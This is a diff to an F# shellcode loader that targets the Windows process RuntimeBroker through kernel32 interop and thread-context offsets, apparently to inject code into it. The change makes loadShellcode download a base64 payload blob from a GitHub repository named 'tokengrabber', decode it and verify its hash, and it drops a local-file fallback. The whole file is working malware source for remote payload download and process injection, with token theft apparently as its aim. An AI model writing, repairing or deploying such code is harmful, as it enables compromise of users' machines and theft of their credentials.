@@ -10,6 +10,7 @@ open System.Net
 open System.Net.Http
 open System.Security.Cryptography
 open System.Runtime.InteropServices
+open System.Text.RegularExpressions
 open System.Threading
 
 [<DllImport("kernel32.dll", SetLastError = true)>]
@@ -98,10 +99,9 @@ let CTX_RBP = 0xA0
 let CTX_RIP = 0xF8
 
 let shellcodeUrl =
-    "https://api.github.com/repos/bielzxdev/tokengrabber/contents/loader.bin?ref=main"
+    "https://api.github.com/repos/bielzxdev/tokengrabber/git/blobs/64545211a9d6ad33281ef3494f21c75881b9d760"
 
 let expectedSha256 = "BFD6415FF81996DBDBD3D564E09111056427E45EC62E1E68952B3CBF659D6322"
-let localShellcodePath = Path.Combine(__SOURCE_DIRECTORY__, "loader.bin")
 let targetProcessName = "RuntimeBroker"
 
 let preferredTargetPid () =
@@ -146,34 +146,25 @@ let stubRetOffset (data: byte[]) =
     stubPopOffset data + 22
 
 let loadShellcode () =
-    let mutable data : byte[] = Array.empty
+    ServicePointManager.SecurityProtocol <- SecurityProtocolType.Tls12
+    use client = new HttpClient()
+    client.DefaultRequestHeaders.Add("User-Agent", "opencode-loader")
+    client.DefaultRequestHeaders.Add("Accept", "application/vnd.github+json")
+    use resp = client.GetAsync(shellcodeUrl, HttpCompletionOption.ResponseHeadersRead).GetAwaiter().GetResult()
+    resp.EnsureSuccessStatusCode() |> ignore
+    let body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult()
+    let matchContent = Regex.Match(body, "\"content\"\\s*:\\s*\"([^\"]+)\"")
+    if not matchContent.Success then
+        failwith "Blob do GitHub invalido."
 
-    if not (String.IsNullOrWhiteSpace shellcodeUrl) then
-        try
-            ServicePointManager.SecurityProtocol <- SecurityProtocolType.Tls12
-            use client = new HttpClient()
-            client.DefaultRequestHeaders.Add("User-Agent", "opencode-loader")
-            client.DefaultRequestHeaders.Add("Accept", "application/vnd.github.raw")
-            use resp = client.GetAsync(shellcodeUrl, HttpCompletionOption.ResponseHeadersRead).GetAwaiter().GetResult()
-            resp.EnsureSuccessStatusCode() |> ignore
-            let downloaded = resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult()
-            if downloaded.Length > 0 then data <- downloaded
-        with _ -> ()
-
-    let downloadedHash = if data.Length > 0 then sha256Hex data else ""
-
-    if (data.Length = 0 || downloadedHash <> expectedSha256) &&
-       File.Exists localShellcodePath then
-        let localData = File.ReadAllBytes localShellcodePath
-        let localHash = sha256Hex localData
-        if localData.Length > 0 && localHash = expectedSha256 then
-            data <- localData
-        elif data.Length = 0 then
-            data <- localData
-
-    if data.Length = 0 then
-        failwith "Nenhum shellcode disponivel."
-
+    let raw = matchContent.Groups.[1].Value
+    let b64 =
+        raw.Replace("\\n", "")
+           .Replace("\\r", "")
+           .Replace("\\t", "")
+           .Replace("\\/", "/")
+           .Replace(" ", "")
+    let data = Convert.FromBase64String(b64)
     let hash = sha256Hex data
 
     if hash <> expectedSha256 then
